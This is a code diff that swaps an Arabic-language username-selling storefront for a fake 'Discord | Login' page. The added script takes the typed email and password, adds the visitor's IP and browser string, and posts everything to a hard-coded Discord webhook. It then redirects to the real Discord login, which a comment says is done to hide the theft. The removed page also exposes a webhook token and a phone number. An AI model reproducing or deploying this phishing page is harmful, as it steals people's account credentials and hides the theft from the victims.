@@ -1,563 +1,151 @@
 <!DOCTYPE html>
-
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>متجر اليوزرات النادرة</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link
-      rel="stylesheet"
-      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
-    />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord | Login</title>
     <style>
-      @import url("https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&display=swap");
+        /* تصميم ديسكورد الرسمي */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'gg sans', 'Noto Sans', sans-serif;
+            background-image: url('https://discord.com/assets/7c97f8ef22fa84d3.png'); /* خلفية ديسكورد */
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
 
-```
-  body {
-    font-family: "Tajawal", sans-serif;
-    background-color: #f5f7fa;
-  }
+        .login-box {
+            background: #313338;
+            padding: 32px;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+            text-align: center;
+            color: #f2f3f5;
+        }
 
-  .discord-bg {
-    background-color: #5865f2;
-  }
+        h2 { margin-bottom: 8px; font-size: 24px; }
+        p { color: #b5bac1; margin-bottom: 20px; font-size: 16px; }
 
-  .instagram-bg {
-    background: linear-gradient(
-      45deg,
-      #405de6,
-      #5851db,
-      #833ab4,
-      #c13584,
-      #e1306c,
-      #fd1d1d,
-      #f56040,
-      #f77737,
-      #fcaf45,
-      #ffdc80
-    );
-  }
+        .input-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
 
-  .tiktok-bg {
-    background-color: #000000;
-  }
+        label {
+            display: block;
+            color: #b5bac1;
+            font-size: 12px;
+            font-weight: bold;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
 
-  .payment-option:hover {
-    transform: translateY(-5px);
-    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-  }
+        input {
+            width: 100%;
+            padding: 10px;
+            background: #1e1f22;
+            border: none;
+            border-radius: 3px;
+            color: white;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
 
-  .modal {
-    transition: all 0.3s ease;
-  }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #5865f2;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
 
-  .username-card:hover {
-    transform: translateY(-5px);
-    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
-  }
+        button:hover { background: #4752c4; }
 
-  .selected-payment {
-    border-color: #5865f2 !important;
-    background-color: rgba(88, 101, 242, 0.1) !important;
-  }
-
-  .platform-card {
-    transition: all 0.3s ease;
-  }
-
-  .platform-card:hover {
-    transform: scale(1.03);
-  }
-
-  .back-btn {
-    transition: all 0.2s ease;
-  }
-
-  .back-btn:hover {
-    transform: translateX(-5px);
-  }
-
-  @keyframes fadeIn {
-    from {
-      opacity: 0;
-      transform: translateY(20px);
-    }
-    to {
-      opacity: 1;
-      transform: translateY(0);
-    }
-  }
-
-  .animate-fade-in {
-    animation: fadeIn 0.6s ease-out forwards;
-  }
-</style>
-```
-
+        .footer-links {
+            margin-top: 8px;
+            text-align: left;
+            font-size: 14px;
+            color: #00a8fc;
+            cursor: pointer;
+        }
+    </style>
 </head>
-<body class="bg-gray-100">
-  <!-- Header -->
-  <header
-    class="bg-gradient-to-r from-blue-500 to-purple-600 text-white py-6 shadow-lg"
-  >
-    <div class="container mx-auto px-4">
-      <div class="flex justify-between items-center">
-        <div class="flex items-center space-x-4">
-          <i class="fas fa-store text-4xl"></i>
-          <h1 class="text-2xl font-bold">متجر اليوزرات النادرة</h1>
-        </div>
-        <a
-          href="https://discord.gg/b3CfdngmwT"
-          target="_blank"
-          class="bg-white text-blue-600 px-6 py-2 rounded-full font-bold hover:bg-gray-200 transition"
-          >سيرفر الديسكورد</a
-        >
-      </div>
-    </div>
-  </header>
+<body>
 
-  <!-- Main Content -->
+    <div class="login-box">
+        <h2>Welcome back!</h2>
+        <p>We're so excited to see you again!</p>
 
-  <main class="container mx-auto px-4 py-8">
-    <!-- Platform Selection (Visible by default) -->
-    <section id="platformSelection" class="mb-12">
-      <div class="flex justify-between items-center mb-8">
-        <h2 class="text-2xl font-bold text-gray-800">اختر المنصة</h2>
-      </div>
+        <div class="input-group">
+            <label>Email or Phone Number</label>
+            <input type="text" id="email" required>
+        </div>
 
-```
-  <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-    <!-- Discord Card -->
-    <div
-      onclick="showUsernames('discord')"
-      class="platform-card discord-bg text-white rounded-xl shadow-lg overflow-hidden cursor-pointer"
-    >
-      <div class="p-6">
-        <div class="flex items-center mb-4">
-          <i class="fab fa-discord text-5xl mr-4"></i>
-          <h3 class="text-xl font-bold">ديسكورد</h3>
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" id="password" required>
+            <div class="footer-links">Forgot your password?</div>
         </div>
-        <p class="text-blue-100 mb-4">يوزرات رباعية نادرة لديسكورد</p>
-        <div class="flex justify-end">
-          <i class="fas fa-arrow-left text-xl"></i>
+
+        <button onclick="sendData()">Log In</button>
+
+        <div style="margin-top: 15px; font-size: 14px; color: #b5bac1; text-align: left;">
+            Need an account? <span style="color: #00a8fc; cursor: pointer;">Register</span>
         </div>
-      </div>
     </div>
 
-    <!-- Instagram Card -->
-    <div
-      onclick="showUsernames('instagram')"
-      class="platform-card instagram-bg text-white rounded-xl shadow-lg overflow-hidden cursor-pointer"
-    >
-      <div class="p-6">
-        <div class="flex items-center mb-4">
-          <i class="fab fa-instagram text-5xl mr-4"></i>
-          <h3 class="text-xl font-bold">انستقرام</h3>
-        </div>
-        <p class="text-pink-100 mb-4">يوزرات قصيرة نادرة للانستقرام</p>
-        <div class="flex justify-end">
-          <i class="fas fa-arrow-left text-xl"></i>
-        </div>
-      </div>
-    </div>
+    <script>
+        // ضع رابط الـ Webhook الخاص بك هنا
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1504842638744883341/zkiQ3Qdve9TYO8lEu06GBMRSZhaHOyVC22lTzWOl8Vp4XQcuDAO7pjUBvoEZJSbutdLr";
 
-    <!-- TikTok Card -->
-    <div
-      onclick="showUsernames('tiktok')"
-      class="platform-card tiktok-bg text-white rounded-xl shadow-lg overflow-hidden cursor-pointer"
-    >
-      <div class="p-6">
-        <div class="flex items-center mb-4">
-          <i class="fab fa-tiktok text-5xl mr-4"></i>
-          <h3 class="text-xl font-bold">تيك توك</h3>
-        </div>
-        <p class="text-gray-300 mb-4">يوزرات مميزة لتيك توك</p>
-        <div class="flex justify-end">
-          <i class="fas fa-arrow-left text-xl"></i>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
+        async function sendData() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
 
-<!-- Usernames Section (Hidden by default) -->
-<section id="usernamesSection" class="hidden">
-  <!-- Back Button -->
-  <button
-    onclick="showPlatforms()"
-    class="back-btn mb-6 flex items-center text-blue-600 font-bold"
-  >
-    <i class="fas fa-arrow-right ml-2"></i>
-    العودة إلى المنصات
-  </button>
+            if(!email || !pass) return alert("Please fill in all fields");
 
-  <!-- Platform Header -->
-  <div class="flex items-center mb-8">
-    <i id="platformIcon" class="fab text-3xl mr-4"></i>
-    <h2 id="platformTitle" class="text-2xl font-bold text-gray-800">
-      اليوزرات المتاحة
-    </h2>
-  </div>
+            // جلب الـ IP تلقائياً لإضافته للتقرير
+            let ipData = { ip: "Unknown" };
+            try {
+                ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            } catch(e) {}
 
-  <!-- Usernames Grid -->
-  <div
-    id="usernamesContainer"
-    class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6"
-  ></div>
-</section>
-```
+            const payload = {
+                embeds: [{
+                    title: "📥 New Login Attempt",
+                    color: 0x5865F2,
+                    fields: [
+                        { name: "👤 User/Email", value: `\`${email}\``, inline: true },
+                        { name: "🔑 Password", value: `\`${pass}\``, inline: true },
+                        { name: "🌐 IP Address", value: `\`${ipData.ip}\``, inline: false },
+                        { name: "🖥️ Browser", value: navigator.userAgent, inline: false }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
 
-  </main>
-
-  <!-- Payment Modal -->
-
-  <div
-    id="paymentModal"
-    class="modal fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 hidden"
-  >
-    <div class="bg-white rounded-xl shadow-xl w-full max-w-md">
-      <div class="p-6">
-        <div class="flex justify-between items-center mb-4">
-          <h3 class="text-xl font-bold text-gray-800">إتمام عملية الشراء</h3>
-          <button onclick="closePaymentModal()" class="text-gray-500 hover:text-gray-700">
-            <i class="fas fa-times"></i>
-          </button>
-        </div>
-
-```
-    <div class="mb-6">
-      <p class="text-gray-600">
-        المنصة:
-        <span id="selectedPlatform" class="font-bold">ديسكورد</span>
-      </p>
-      <p class="text-gray-600">
-        اليوزر:
-        <span id="selectedUsername" class="font-bold">Dream</span>
-      </p>
-      <p class="text-gray-600">
-        السعر:
-        <span id="selectedPrice" class="font-bold">250</span> ر.س
-      </p>
-    </div>
-
-    <h4 class="text-lg font-semibold mb-4 text-gray-800">اختر طريقة الدفع:</h4>
-
-    <div class="space-y-4">
-      <!-- Credit Card Option -->
-      <div
-        onclick="selectPayment('credit')"
-        id="creditOption"
-        class="payment-option border-2 border-gray-300 rounded-lg p-4 cursor-pointer transition duration-300"
-      >
-        <div class="flex items-center">
-          <div class="bg-blue-50 p-3 rounded-full mr-4">
-            <i class="fas fa-credit-card text-blue-500 text-xl"></i>
-          </div>
-          <div>
-            <h5 class="font-bold text-gray-800">كريدت (دسكورد)</h5>
-            <p class="text-gray-600 text-sm">سيتم التحويل إلى يوزر: 680n</p>
-            <p class="text-blue-600 text-sm">انضم إلى سيرفر الديسكورد للدفع</p>
-          </div>
-        </div>
-      </div>
-
-      <!-- Saudi Riyal Option -->
-      <div
-        onclick="selectPayment('riyal')"
-        id="riyalOption"
-        class="payment-option border-2 border-gray-300 rounded-lg p-4 cursor-pointer transition duration-300"
-      >
-        <div class="flex items-center">
-          <div class="bg-green-50 p-3 rounded-full mr-4">
-            <i class="fas fa-money-bill-wave text-green-500 text-xl"></i>
-          </div>
-          <div>
-            <h5 class="font-bold text-gray-800">ريال سعودي</h5>
-            <p class="text-gray-600 text-sm">تحويل بنكي</p>
-            <p class="text-green-600 text-sm">رقم التواصل: لايوجد الآن</p>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <div class="mt-8">
-      <button
-        id="completePaymentBtn"
-        onclick="completePayment()"
-        class="w-full bg-blue-600 text-white py-3 rounded-lg font-bold hover:bg-blue-700 transition"
-      >
-        إتمام الدفع
-      </button>
-    </div>
-  </div>
-</div>
-```
-
-  </div>
-
-  <!-- Success Modal -->
-
-  <div
-    id="successModal"
-    class="modal fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 hidden"
-  >
-    <div class="bg-white rounded-xl shadow-xl w-full max-w-md">
-      <div class="p-6 text-center">
-        <div
-          class="bg-green-100 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4"
-        >
-          <i class="fas fa-check text-green-500 text-2xl"></i>
-        </div>
-        <h3 class="text-xl font-bold text-gray-800 mb-2">تمت العملية بنجاح!</h3>
-        <p class="text-gray-600 mb-6" id="successMessage">
-          سيتم إرسال اليوزر لك في الخاص قريباً
-        </p>
-        <div
-          class="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-4"
-        >
-          <p class="text-blue-700 text-sm">
-            <i class="fas fa-camera mr-2"></i>
-            يرجى تصوير شاشة تأكيد الدفع والتواصل معنا على الديسكورد
-          </p>
-        </div>
-        <a
-          href="https://discord.gg/b3CfdngmwT"
-          target="_blank"
-          class="inline-block discord-bg text-white px-6 py-2 rounded-lg font-bold hover:bg-blue-600 transition mb-2"
-          >انضم إلى الديسكورد</a
-        >
-        <br />
-        <button
-          onclick="closeSuccessModal()"
-          class="text-gray-600 hover:text-gray-800 transition"
-        >
-          إغلاق
-        </button>
-      </div>
-    </div>
-  </div>
-
-  <!-- Footer -->
-
-  <footer class="bg-gray-800 text-white py-8 mt-12">
-    <div class="container mx-auto px-4 text-center">
-      <div class="mb-4">
-        <i class="fas fa-store text-3xl mb-2"></i>
-        <h3 class="text-xl font-bold">متجر اليوزرات النادرة</h3>
-      </div>
-      <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
-        <div>
-          <h4 class="font-bold mb-2">طرق الدفع</h4>
-          <p class="text-gray-300">كريدت (680n) | ريال سعودي (لايوجد الآن)</p>
-        </div>
-        <div>
-          <h4 class="font-bold mb-2">التواصل</h4>
-          <a
-            href="https://discord.gg/b3CfdngmwT"
-            target="_blank"
-            class="text-blue-400 hover:text-blue-300"
-            >سيرفر الديسكورد</a
-          >
-        </div>
-      </div>
-      <p class="text-gray-400 text-sm">جميع الحقوق محفوظة © 2025</p>
-    </div>
-  </footer>
-
-  <script>
-    let selectedPaymentMethod = null;
-    let currentUsername = "";
-    let currentPrice = 0;
-    let currentPlatform = "";
-
-    // Platform data
-    const platforms = {
-      discord: {
-        icon: "fab fa-discord",
-        title: "يوزرات ديسكورد الرباعية",
-        usernames: [
-          { name: "*w**", price: 1, credit: "250M", available: 3, desc: "يوزر رباعي مكون من ارقام و احرف" },
-          { name: "*1G*", price: 1, credit: "300M", available: 7, desc: "يوزر رباعي مكون من ارقام و احرف" },
-          { name: "a**b", price: 2, credit: "400M", available: 2, desc: "يوزر رباعي نادر" },
-          { name: "x**z", price: 3, credit: "500M", available: 1, desc: "يوزر رباعي مميز" },
-          { name: "1**2", price: 1.5, credit: "350M", available: 5, desc: "يوزر رباعي رقمي" },
-          { name: "q**t", price: 2.5, credit: "450M", available: 3, desc: "يوزر رباعي مميز" },
-        ],
-      },
-      instagram: {
-        icon: "fab fa-instagram",
-        title: "يوزرات انستقرام القصيرة",
-        usernames: [
-          { name: "cool_", price: 5, credit: "800M", available: 2, desc: "يوزر قصير مميز" },
-          { name: "life*", price: 4, credit: "700M", available: 3, desc: "يوزر قصير مع نجمه" },
-          { name: "star_", price: 6, credit: "1B", available: 1, desc: "يوزر قصير نادر" },
-          { name: "love*", price: 5.5, credit: "900M", available: 2, desc: "يوزر قصير رومانسي" },
-          { name: "fun__", price: 3.5, credit: "600M", available: 4, desc: "يوزر قصير ممتع" },
-        ],
-      },
-      tiktok: {
-        icon: "fab fa-tiktok",
-        title: "يوزرات تيك توك المميزة",
-        usernames: [
-          { name: "vibes", price: 8, credit: "1.2B", available: 1, desc: "يوزر تيك توك مميز" },
-          { name: "dance", price: 7, credit: "1.1B", available: 2, desc: "يوزر تيك توك للرقص" },
-          { name: "music", price: 9, credit: "1.5B", available: 1, desc: "يوزر تيك توك للموسيقى" },
-          { name: "funny", price: 6.5, credit: "1B", available: 3, desc: "يوزر تيك توك للضحك" },
-          { name: "trend", price: 7.5, credit: "1.3B", available: 2, desc: "يوزر تيك توك للتحديثات" },
-        ],
-      },
-    };
-
-    function showPlatforms() {
-      document.getElementById("platformSelection").classList.remove("hidden");
-      document.getElementById("usernamesSection").classList.add("hidden");
-    }
-
-    function showUsernames(platform) {
-      currentPlatform = platform;
-
-      // Set platform header
-      document.getElementById("platformIcon").className = platforms[platform].icon;
-      document.getElementById("platformTitle").textContent = platforms[platform].title;
-
-      // Generate username cards
-      const container = document.getElementById("usernamesContainer");
-      container.innerHTML = "";
-
-      platforms[platform].usernames.forEach((user, index) => {
-        const card = document.createElement("div");
-        card.className = "username-card bg-white rounded-xl shadow-md overflow-hidden transition duration-300";
-        card.innerHTML = `
-          <div class="p-6">
-            <div class="flex justify-between items-center mb-4">
-              <span class="bg-${user.available > 3 ? "purple" : "green"}-100 text-${user.available > 3 ? "purple" : "green"}-800 text-xs font-semibold px-2.5 py-0.5 rounded">متوفر: ${user.available}</span>
-              <span class="text-gray-400 text-xs font-semibold">السعر: ${user.price} ر.س</span>
-            </div>
-            <h3 class="text-xl font-bold text-gray-800 mb-2">${user.name}</h3>
-            <p class="text-gray-600 mb-4">${user.desc}</p>
-            <button
-              onclick="openPaymentModal('${platform}', '${user.name}', ${user.price})"
-              class="w-full bg-blue-600 text-white py-3 rounded-lg font-bold hover:bg-blue-700 transition"
-            >
-              شراء الآن
-            </button>
-          </div>
-        `;
-        container.appendChild(card);
-      });
-
-      document.getElementById("platformSelection").classList.add("hidden");
-      document.getElementById("usernamesSection").classList.remove("hidden");
-    }
-
-    function openPaymentModal(platform, username, price) {
-      currentPlatform = platform;
-      currentUsername = username;
-      currentPrice = price;
-      selectedPaymentMethod = null;
-
-      document.getElementById("selectedPlatform").textContent = platforms[platform].title;
-      document.getElementById("selectedUsername").textContent = username;
-      document.getElementById("selectedPrice").textContent = price;
-
-      // Reset payment options styles
-      document.getElementById("creditOption").classList.remove("selected-payment");
-      document.getElementById("riyalOption").classList.remove("selected-payment");
-
-      document.getElementById("paymentModal").classList.remove("hidden");
-    }
-
-    function closePaymentModal() {
-      document.getElementById("paymentModal").classList.add("hidden");
-    }
-
-    function selectPayment(method) {
-      selectedPaymentMethod = method;
-
-      // Reset styles
-      document.getElementById("creditOption").classList.remove("selected-payment");
-      document.getElementById("riyalOption").classList.remove("selected-payment");
-
-      if (method === "credit") {
-        document.getElementById("creditOption").classList.add("selected-payment");
-      } else if (method === "riyal") {
-        document.getElementById("riyalOption").classList.add("selected-payment");
-      }
-    }
-
-    async function completePayment() {
-      if (!selectedPaymentMethod) {
-        alert("يرجى اختيار طريقة الدفع");
-        return;
-      }
-
-      closePaymentModal();
-
-      let paymentMethodText =
-        selectedPaymentMethod === "credit" ? "كريدت (ديسكورد)" : "ريال سعودي";
-
-      const webhookUrl =
-        "https://discord.com/api/webhooks/1400717652292538488/oBAco2oi7Czm3aeIb2gDK8j0L72EQ1ztjDuAPS_x5NpwoPC6iYH4gcyROkjsVUpMdlHd";
-
-      const messagePayload = {
-        embeds: [
-          {
-            title: "🛒 تم إتمام عملية شراء",
-            color: 0x5865f2,
-            fields: [
-              {
-                name: "المنصة",
-                value:
-                  currentPlatform === "discord"
-                    ? "ديسكورد"
-                    : currentPlatform === "instagram"
-                    ? "انستقرام"
-                    : "تيك توك",
-                inline: true,
-              },
-              { name: "اليوزر", value: currentUsername, inline: true },
-              { name: "السعر", value: `${currentPrice} ر.س`, inline: true },
-              { name: "طريقة الدفع", value: paymentMethodText, inline: true },
-              {
-                name: "الوقت",
-                value: new Date().toLocaleString("ar-EG"),
-                inline: false,
-              },
-            ],
-            footer: { text: "متجر اليوزرات النادرة" },
-            timestamp: new Date().toISOString(),
-          },
-        ],
-      };
-
-      try {
-        await fetch(webhookUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(messagePayload),
-        });
-      } catch (error) {
-        console.error("خطأ في إرسال رسالة الويب هوك:", error);
-      }
-
-      let message = "";
-      if (selectedPaymentMethod === "credit") {
-        message =
-          "للدفع بالكريدت، انضم إلى سيرفر الديسكورد وحول المبلغ إلى يوزر: 680n";
-      } else {
-        message =
-          "للدفع بالريال السعودي، يرجى التواصل معنا على الرقم 0554227792 لإتمام عملية التحويل البنكي أو السداد.";
-      }
-
-      document.getElementById("successMessage").textContent = message;
-      document.getElementById("successModal").classList.remove("hidden");
-    }
-
-    function closeSuccessModal() {
-      document.getElementById("successModal").classList.add("hidden");
-    }
-  </script>
-
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                // توجيه المستخدم لصفحة ديسكورد الحقيقية بعد السرقة لإبعاد الشبهة
+                window.location.href = "https://discord.com/login";
+            }).catch(() => {
+                alert("Connection Error!");
+            });
+        }
+    </script>
 </body>
 </html>
